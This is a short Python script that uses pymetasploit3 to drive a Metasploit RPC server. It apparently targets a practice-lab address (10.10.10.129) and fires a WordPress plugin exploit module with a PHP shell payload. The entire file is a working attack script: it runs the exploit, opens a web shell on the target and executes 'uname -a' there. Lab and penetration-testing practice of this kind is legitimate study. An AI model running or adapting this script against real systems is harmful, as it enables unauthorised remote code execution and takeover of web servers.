from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('mycroft', port = 55552)

exploit = client.modules.use('exploit', 'unix/webapp/wordpress_zabbix_plugin_new')

exploit['RHOSTS'] = "10.10.10.129"

exploit['URI'] = "/wordpress"


payload = client.modules.use('payload', 'php/shell_php')

#print(exploit.execute(payload=payload))
#print(client.jobs.list)
#print(client.jobs.info(list(client.jobs.list.keys())[0]))

console_id = client.consoles.console().cid
console = client.consoles.console(console_id)
console.write('show options\n')
print(console.read()['data'])
print(console.run_module_with_output(exploit, payload))
console.write('uname -a\n')
print(console.read())